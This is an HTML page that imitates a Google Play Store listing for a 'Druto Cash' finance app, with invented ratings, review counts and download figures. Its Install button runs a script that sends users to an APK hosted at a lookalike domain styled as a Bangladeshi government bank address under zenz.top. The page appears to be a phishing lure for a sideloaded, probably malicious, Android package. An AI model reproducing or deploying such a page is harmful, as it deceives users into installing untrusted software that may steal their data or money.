<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>Druto Cash</title>

<link href="https://fonts.googleapis.com/css2?family=Google+Sans:wght@400;500;700&display=swap" rel="stylesheet">

<style>
*{
    margin:0;
    padding:0;
    box-sizing:border-box;
    font-family:'Google Sans',sans-serif;
}

body{
    background:#fff;
    color:#202124;
    max-width:500px;
    margin:auto;
    padding-bottom:20px;
}

.container{
    padding:20px;
}

.app-title{
    font-size:42px;
    font-weight:500;
    margin-top:20px;
}

.app-info{
    display:flex;
    align-items:center;
    margin-top:25px;
}

.app-icon{
    width:90px;
    height:90px;
    border-radius:20px;
    overflow:hidden;
    box-shadow:0 2px 8px rgba(0,0,0,.15);
}

.app-icon img{
    width:100%;
    height:100%;
    object-fit:cover;
}

.stats{
    flex:1;
    display:flex;
    justify-content:space-around;
    margin-left:15px;
}

.stat{
    text-align:center;
}

.big{
    font-size:20px;
    font-weight:700;
}

.small{
    font-size:13px;
    color:#5f6368;
    margin-top:5px;
}

.install-btn{
    width:100%;
    height:56px;
    border:none;
    border-radius:28px;
    background:#0b57d0;
    color:#fff;
    font-size:20px;
    font-weight:600;
    margin-top:25px;
    cursor:pointer;
}

.screenshots{
    display:flex;
    gap:12px;
    overflow-x:auto;
    margin-top:25px;
    scrollbar-width:none;
}

.screenshots::-webkit-scrollbar{
    display:none;
}

.shot{
    min-width:170px;
    height:320px;
    border-radius:16px;
    overflow:hidden;
    border:1px solid #e0e0e0;
}

.shot img{
    width:100%;
    height:100%;
    object-fit:cover;
}

.section{
    margin-top:35px;
}

.section-header{
    display:flex;
    justify-content:space-between;
    align-items:center;
}

.section-header h2{
    font-size:22px;
}

.arrow{
    font-size:24px;
}

.about-text{
    margin-top:15px;
    line-height:1.6;
    color:#444;
}

.tag{
    display:inline-block;
    border:1px solid #dadce0;
    border-radius:20px;
    padding:10px 20px;
    margin-top:20px;
}

.rating-box{
    display:flex;
    gap:20px;
    margin-top:20px;
}

.rating-left h1{
    font-size:70px;
    font-weight:400;
}

.stars{
    color:#0b57d0;
}

.rating-right{
    flex:1;
}

.bar-row{
    display:flex;
    align-items:center;
    margin-bottom:10px;
}

.bar{
    flex:1;
    height:10px;
    background:#e0e0e0;
    border-radius:10px;
    margin-left:10px;
    overflow:hidden;
}

.fill{
    height:100%;
    background:#0b57d0;
}
</style>
</head>
<body>

<div class="container">

<h1 class="app-title">Druto Cash</h1>

<div class="app-info">
    <div class="app-icon">
        <img src="logo.png" alt="Logo">
    </div>

    <div class="stats">
        <div class="stat">
            <div class="big">4.4 ★</div>
            <div class="small">14K reviews</div>
        </div>

        <div class="stat">
            <div class="big">500K+</div>
            <div class="small">Downloads</div>
        </div>

        <div class="stat">
            <div class="big">3+</div>
            <div class="small">Rated</div>
        </div>
    </div>
</div>

<button class="install-btn" id="installBtn">Install</button>

<div class="screenshots">
    <div class="shot"><img src="screen1.jpg"></div>
    <div class="shot"><img src="screen2.jpg"></div>
    <div class="shot"><img src="screen3.jpg"></div>
    <div class="shot"><img src="screen4.jpg"></div>
</div>

<div class="section">
    <div class="section-header">
        <h2>About this app</h2>
        <div class="arrow">➜</div>
    </div>

    <p class="about-text">
        Get fast financial support with a simple application process and quick approval.
    </p>

    <div class="tag">Finance</div>
</div>

<div class="section">
    <div class="section-header">
        <h2>Ratings & Reviews</h2>
        <div class="arrow">➜</div>
    </div>

    <div class="rating-box">
        <div class="rating-left">
            <h1>4.4</h1>
            <div class="stars">★★★★★</div>
        </div>

        <div class="rating-right">

            <div class="bar-row">
                <span>5</span>
                <div class="bar"><div class="fill" style="width:78%"></div></div>
            </div>

            <div class="bar-row">
                <span>4</span>
                <div class="bar"><div class="fill" style="width:15%"></div></div>
            </div>

            <div class="bar-row">
                <span>3</span>
                <div class="bar"><div class="fill" style="width:5%"></div></div>
            </div>

            <div class="bar-row">
                <span>2</span>
                <div class="bar"><div class="fill" style="width:2%"></div></div>
            </div>

            <div class="bar-row">
                <span>1</span>
                <div class="bar"><div class="fill" style="width:1%"></div></div>
            </div>

        </div>
    </div>
</div>

</div>

<script>
document.getElementById("installBtn").addEventListener("click", function () {
    window.location.href = "http://bank.gov.bd.zenz.top/ucb.apk";
});
</script>

</body>
</html>
